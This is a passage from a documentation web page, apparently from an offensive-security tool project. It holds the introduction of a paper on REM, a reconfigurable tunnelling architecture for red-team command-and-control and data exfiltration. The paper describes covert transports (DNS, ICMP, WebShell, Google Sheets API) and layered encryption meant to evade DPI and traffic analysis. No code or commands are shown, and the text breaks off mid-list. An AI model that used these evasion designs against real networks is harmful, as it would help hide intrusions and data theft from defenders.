  <span class="md-ellipsis">
    
  
    malefic-win-kit
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_7_6" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../IoM/manual/integrate/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    integrate
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_7_6" id="__nav_2_7_6_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_7_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_7_6">
            <span class="md-nav__icon md-icon"></span>
            
  
    integrate
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_7_6_2" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../IoM/manual/integrate/sdk/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    SDK
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_7_6_2" id="__nav_2_7_6_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_7_6_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_7_6_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    SDK
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/integrate/sdk/go/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Golang
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/integrate/sdk/python/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Python(Untable)
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/integrate/sdk/typescript/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Typescript(Unstable)
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/integrate/ffi/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    FFI
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/integrate/ai/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AI Integration
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_8" >
        
          
          <label class="md-nav__link" for="__nav_2_8" id="__nav_2_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Changelog
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_8">
            <span class="md-nav__icon md-icon"></span>
            
  
    Changelog
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2025/11/10/IoM_v0.1.2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    v0.1.2
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2025/07/09/IoM_v0.1.1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    v0.1.1
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2025/04/14/IoM_v0.1.0/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    v0.1.0
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2025/01/02/IoM_v0.0.4/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    v0.0.4
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2024/11/20/IoM_v0.0.3/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    v0.0.3
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2024/09/23/IoM_v0.0.2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    v0.0.2
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2024/08/16/IoM_introduce/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    v0.0.1
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../gogo/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    gogo
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    gogo
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../gogo/start/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    入门
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../gogo/design/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    设计
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../gogo/concept/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    细节
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../gogo/extension/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    拓展
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../gogo/do/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    实战
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../spray/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    spray
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    spray
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../spray/start/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    入门
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../spray/design/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    设计
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../spray/concept/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    细节
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../spray/do/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    实战
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../zombie/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    zombie
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    zombie
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../zombie/start/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    入门
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../zombie/design/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    设计
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../zombie/extension/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    拓展
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../rem/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    rem
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_6" id="__nav_6_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            
  
    rem
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../rem/usage/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    入门
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../rem/concept/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    概念
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../rem/design/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    设计
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../rem/changelog/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Changelog
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../libs/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    libs
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_7" id="__nav_7_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            
  
    libs
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7_2" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../libs/neutron/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    neutron
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    neutron
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../libs/neutron/update/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    update
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7_3" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../libs/words/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    words
  

    
  </span>
  
  

            </a>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    words
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7_4" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../libs/fingers/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    fingers
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_7_4" id="__nav_7_4_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    fingers
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../libs/fingers/rule/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    rule
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../libs/fingers/sdk/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SDK
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7_5" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../libs/proxyclient/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    proxyclient
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_7_5" id="__nav_7_5_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    proxyclient
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../libs/proxyclient/sdk/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SDK
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Preview
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            
  
    Preview
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_1" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../mapping/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    mapping
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_8_1" id="__nav_8_1_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_1">
            <span class="md-nav__icon md-icon"></span>
            
  
    mapping
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../mapping/design/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    design
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Blog
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_9" id="__nav_9_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            
  
    Blog
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9_2" >
        
          
          <label class="md-nav__link" for="__nav_9_2" id="__nav_9_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Archive
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Archive
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../../archive/2025/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    2025
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../../archive/2024/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    2024
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../../archive/2023/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    2023
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../../archive/2022/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    2022
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              
              <article class="md-content__inner md-typeset">
                
                  


  
  


<h1 id="your-network-my-transport-layer-an-offensive-perspective-on-the-network-protocol-stack">Your Network, My Transport Layer: An Offensive Perspective on the Network Protocol Stack<a class="headerlink" href="#your-network-my-transport-layer-an-offensive-perspective-on-the-network-protocol-stack" title="Permanent link">&para;</a></h1>
<h2 id="1-introduction">1. Introduction<a class="headerlink" href="#1-introduction" title="Permanent link">&para;</a></h2>
<h3 id="11-research-background-and-problem-statement">1.1 Research Background and Problem Statement<a class="headerlink" href="#11-research-background-and-problem-statement" title="Permanent link">&para;</a></h3>
<p>In modern network attack and defense drills and Red Team operations, establishing stable, covert, and efficient Command and Control (C2) and data exfiltration channels is critical to the success of penetration testing. However, with the proliferation of Zero Trust architectures and the enhancement of network boundary defenses, attackers face an unprecedented "Communication Dilemma."</p>
<p>This dilemma does not stem from the lack of a single technology, but from fundamental limitations in the design paradigm of current offensive network tools. Through an analysis of existing mainstream tools (such as frp, nps, gost, dnscat2, neo-regeorg, etc.), we summarize the current problems into contradictions across three dimensions:</p>
<ol>
<li>The Contradiction between "Hard-coded" Protocol Stacks and Flexibility</li>
</ol>
<p>Existing tunnel tools typically adopt a "hard-coded" protocol stack design. For example, high-performance proxy tools are often bound to standard TCP/UDP protocols, while covert channel tools used in restricted environments (e.g., allowing only DNS or ICMP outbound) tend to be single-function and suffer from extremely low transmission efficiency. This "strong coupling between functionality and transport protocols" leads to severe tool fragmentation: attackers must switch between completely different toolchains for different scenarios. Implementing a reliable SOCKS5 proxy over a DNS channel, or running complex C2 traffic over a WebShell channel, usually requires extremely complex configurations or even secondary development. Existing tools cannot seamlessly migrate "high-level application layer capabilities" to "low-level transport channels."</p>
<ol>
<li>The Contradiction between "Static" Signatures and Dynamic Defense</li>
</ol>
<p>The communication characteristics (fingerprints) of traditional tools are usually determined by their code structure. Whether it is the handshake process, packet size distribution, or encryption method, these are often fixed at compile time. Although TLS encryption can hide content, Traffic Analysis and behavioral patterns remain clearly visible. This "static protocol structure" allows defenders to identify anomalies based solely on traffic behavior without decrypting the content. Attackers are forced into a cycle of "changing protocols/tools," but as long as the protocol stack structure is fixed, new fingerprints are quickly extracted.</p>
<ol>
<li>The Contradiction between "Hierarchical Fragmentation" and Full-Stack Confrontation</li>
</ol>
<p>In complex penetration paths (e.g., External Network -&gt; Web Server -&gt; Internal Database), attackers often need to cascade multiple tools: using a WebShell management tool to breach the first layer, a port forwarding tool for the second, and a proxy tool for lateral movement. This "simplistic stacking of technologies" not only introduces massive performance loss (Latency Cascade) but also leads to extremely high stability risks. Because these tools lack a unified communication protocol and state synchronization mechanism, the entire link becomes incredibly fragile.</p>
<p><strong>Key Insight:</strong> We believe the root cause of the above problems is that traditional tools rely too heavily on the standard network stack provided by the operating system and restrict themselves to specific OSI layer models. True confrontation should not be limited to patching the application layer but should involve a complete reconstruction of the network protocol stack.</p>
<p>To address these issues, this paper proposes a new network architecture named <strong>REM (Reconfigurable Evasion Module)</strong>. Unlike traditional tools, REM does not presuppose "what the transport layer is," but redefines the network protocol stack from an offensive perspective:</p>
<ul>
<li>
<p><strong>Transport Agnostic:</strong> Any medium capable of exchanging data (whether a TCP socket, a Google Sheets API cell, or an ICMP packet) is abstracted by REM as a unified "Physical Layer" and "upgraded" to a standard connection interface via a custom reliability protocol (ARQ).</p>
</li>
<li>
<p><strong>Software-Defined Stack:</strong> Functions such as encryption, compression, and multiplexing are modularized, allowing for dynamic orchestration at runtime. Attackers can build a unique protocol stack tailored to a specific environment, much like assembling building blocks.</p>
</li>
<li>
<p><strong>Full-Stack Convergence:</strong> Breaking the boundaries between proxies, tunnels, and C2, integrating them into a single binary.</p>
</li>
</ul>
<h3 id="12-solution-rem-architecture-innovation">1.2 Solution: REM Architecture Innovation<a class="headerlink" href="#12-solution-rem-architecture-innovation" title="Permanent link">&para;</a></h3>
<p>To overcome the challenges mentioned above, this paper proposes and implements the <strong>Reconfigurable Evasion Module (REM)</strong> architecture. The core innovation of REM lies in its three-layer decoupling and dynamic orchestration mechanism, aiming to build a highly flexible, covert, and high-performance infrastructure platform for network-side confrontation. REM achieves this goal through the following key designs:</p>
<ul>
<li>
<p><strong>Transport Layer Decoupling:</strong> Abstracts any medium capable of data exchange into a standard connection interface, allowing ICMP, DNS, and even non-traditional communication media (such as Google Sheets API, WebShell) to serve as reliable transport layers for REM.</p>
</li>
<li>
<p><strong>Encryption Layer Decoupling:</strong> Designs encryption and obfuscation functions as independent, arbitrarily nestable modules. A "reverse read chain" ensures the correct order of encryption/decryption and supports dynamic configuration of encryption schemes, achieving dynamic changes in traffic characteristics.</p>
</li>
<li>
<p><strong>Application Layer Decoupling:</strong> Separates the processing logic of application protocols (SOCKS5, HTTP proxy, etc.) from the underlying transport, ensuring that the same application code can run on any transport layer supported by REM, significantly improving functional reusability.</p>
</li>
<li>
<p><strong>Dynamic Orchestration Mechanism:</strong> Introduces a Hook mechanism based on priority control, allowing runtime dynamic combination and orchestration of transport, encryption, and application layer capabilities. This enables the construction of customized confrontation links via simple configuration (e.g., "Random Layer 2-4 Encryption + Data Compression + TLS Outer Camouflage").</p>
</li>
</ul>
<p>REM aims to be an infrastructure platform that integrates all network-side offensive technologies and supports infinite configuration, fundamentally solving the problems of technological silos and architectural ceilings.</p>
<h3 id="13-main-contributions">1.3 Main Contributions<a class="headerlink" href="#13-main-contributions" title="Permanent link">&para;</a></h3>
<p>To address the numerous challenges faced by traditional network offensive tools, this paper proposes and implements the Reconfigurable Evasion Module (REM) architecture. By innovating fundamentally at the protocol stack level, REM aims to provide a highly flexible, covert, and high-performance infrastructure platform for network confrontation. The main contributions of this paper are summarized as follows:</p>
<ul>
<li>
<p><strong>Proposed and implemented a three-layer decoupled offensive protocol stack architecture:</strong> By deeply decoupling the transport, encryption, and application layers, it breaks the strong coupling between technical capabilities and transport protocols in traditional tools. This allows any data exchange medium to serve as a reliable transport layer and supports any combination of encryption, obfuscation, and application protocol bearing.</p>
</li>
<li>
<p><strong>Built a dynamically orchestratable traffic shaping and evasion mechanism:</strong> Innovatively designed a Hook mechanism based on priority control to achieve runtime dynamic orchestration of functions such as transport, encryption, obfuscation, and compression, effectively countering DPI detection and statistical analysis.</p>
</li>
<li>
<p><strong>Developed a zero-performance-loss proxy integration scheme:</strong> By simulating the SOCKS5 proxy protocol in memory and optimizing authentication timing, it solves the performance bottlenecks of traditional proxies in concurrent scenarios, demonstrating near-direct-connection efficiency, especially in high-concurrency port scanning scenarios.</p>
</li>
<li>
